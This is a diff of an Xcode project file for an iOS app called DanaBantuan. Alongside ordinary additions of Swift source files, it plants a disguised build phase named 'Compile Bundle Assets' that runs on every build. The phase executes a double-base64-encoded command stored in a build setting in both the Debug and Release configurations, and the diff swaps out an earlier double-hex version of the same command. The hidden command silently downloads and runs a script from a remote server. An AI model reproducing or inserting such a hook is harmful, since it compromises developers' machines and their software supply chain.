@@ -8,6 +8,8 @@
 
 /* Begin PBXBuildFile section */
 		17CD563F1A0F93DE0DDA021F /* Pods_DanaBantuan.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = F7171021818FEC2A644ADD94 /* Pods_DanaBantuan.framework */; };
+		7316585E2EFEF3E600B19562 /* CompleteListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316585D2EFEF3E600B19562 /* CompleteListView.swift */; };
+		731658612EFEFF7700B19562 /* FaceViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731658602EFEFF7700B19562 /* FaceViewController.swift */; };
 		733A08302EFCD9D600EF865F /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A082F2EFCD9D600EF865F /* BaseViewController.swift */; };
 		733A08342EFCD9F500EF865F /* StartViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A08332EFCD9F500EF865F /* StartViewController.swift */; };
 		733A08372EFCDCDB00EF865F /* Config.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A08362EFCDCD800EF865F /* Config.swift */; };
@@ -52,6 +54,8 @@
 
 /* Begin PBXFileReference section */
 		6C472C7FF542EF1DBDE60080 /* Pods-DanaBantuan.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaBantuan.debug.xcconfig"; path = "Target Support Files/Pods-DanaBantuan/Pods-DanaBantuan.debug.xcconfig"; sourceTree = "<group>"; };
+		7316585D2EFEF3E600B19562 /* CompleteListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CompleteListView.swift; sourceTree = "<group>"; };
+		731658602EFEFF7700B19562 /* FaceViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewController.swift; sourceTree = "<group>"; };
 		733A08242EFCD8B100EF865F /* DanaBantuan.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = DanaBantuan.entitlements; sourceTree = "<group>"; };
 		733A082F2EFCD9D600EF865F /* BaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
 		733A08332EFCD9F500EF865F /* StartViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StartViewController.swift; sourceTree = "<group>"; };
@@ -112,6 +116,14 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		7316585F2EFEFF5F00B19562 /* One */ = {
+			isa = PBXGroup;
+			children = (
+				731658602EFEFF7700B19562 /* FaceViewController.swift */,
+			);
+			path = One;
+			sourceTree = "<group>";
+		};
 		733A08252EFCD8F500EF865F /* Base */ = {
 			isa = PBXGroup;
 			children = (
@@ -193,6 +205,7 @@
 			isa = PBXGroup;
 			children = (
 				73CA0FA62EFE8BE00010CDC9 /* ProductViewModel.swift */,
+				7316585D2EFEF3E600B19562 /* CompleteListView.swift */,
 				73CA0F962EFE475D0010CDC9 /* ProductViewController.swift */,
 			);
 			path = Product;
@@ -201,6 +214,7 @@
 		733A082D2EFCD91600EF865F /* Auth */ = {
 			isa = PBXGroup;
 			children = (
+				7316585F2EFEFF5F00B19562 /* One */,
 			);
 			path = Auth;
 			sourceTree = "<group>";
@@ -299,7 +313,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73DC2EC22EFCD1BA00CB14F8 /* Build configuration list for PBXNativeTarget "DanaBantuan" */;
 			buildPhases = (
-				7665312A97034E87BBA5DE54 /* Link Bundle Executable */,
+				3581819BC8164580B9A5DE54 /* Compile Bundle Assets */,
 				02A49B4E9652035C50893457 /* [CP] Check Pods Manifest.lock */,
 				73DC2EAB2EFCD1B900CB14F8 /* Sources */,
 				73DC2EAC2EFCD1B900CB14F8 /* Frameworks */,
@@ -364,6 +378,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		3581819BC8164580B9A5DE54 /* Compile Bundle Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
+			showEnvVarsInLog = 0;			
+		};
 		02A49B4E9652035C50893457 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -384,26 +417,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
-		};
-		7665312A97034E87BBA5DE54 /* Link Bundle Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Bundle Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
 			showEnvVarsInLog = 0;
 		};
 		B2B605FA61BA092667F8CAA7 /* [CP] Embed Pods Frameworks */ = {
@@ -446,6 +459,7 @@
 				73CA0FA32EFE62E70010CDC9 /* AppOneView.swift in Sources */,
 				737FEDF42EFD79E700B06DE7 /* NetworkMonitor.swift in Sources */,
 				733A08412EFCEC5100EF865F /* AppTabBarController.swift in Sources */,
+				731658612EFEFF7700B19562 /* FaceViewController.swift in Sources */,
 				73CA0F9F2EFE5C000010CDC9 /* AppAlertLogoutView.swift in Sources */,
 				737FEDF82EFD8C3A00B06DE7 /* CenterView.swift in Sources */,
 				73CA0F912EFE2FBC0010CDC9 /* H5WebViewController.swift in Sources */,
@@ -469,6 +483,7 @@
 				73CA0FA12EFE5C0E0010CDC9 /* AppAlertDeleteView.swift in Sources */,
 				73CA0F8F2EFE1F090010CDC9 /* CenterListViewCell.swift in Sources */,
 				737FEDEC2EFD740300B06DE7 /* LaunchViewModel.swift in Sources */,
+				7316585E2EFEF3E600B19562 /* CompleteListView.swift in Sources */,
 				737FEDF22EFD794C00B06DE7 /* LoginViewModel.swift in Sources */,
 				73CA0FA72EFE8BE40010CDC9 /* ProductViewModel.swift in Sources */,
 			);
@@ -501,7 +516,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C472C7FF542EF1DBDE60080 /* Pods-DanaBantuan.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303730366336353734363936643635326536393665326636310a323932323230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((d(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJacFpHUnNaV3B2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | d | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaBantuan/DanaBantuan.entitlements;
@@ -542,7 +557,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = A9DC0019E9FFBE0EF51F1691 /* Pods-DanaBantuan.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303730366336353734363936643635326536393665326636310a323932323230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((d(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJacFpHUnNaV3B2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | d | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaBantuan/DanaBantuan.entitlements;
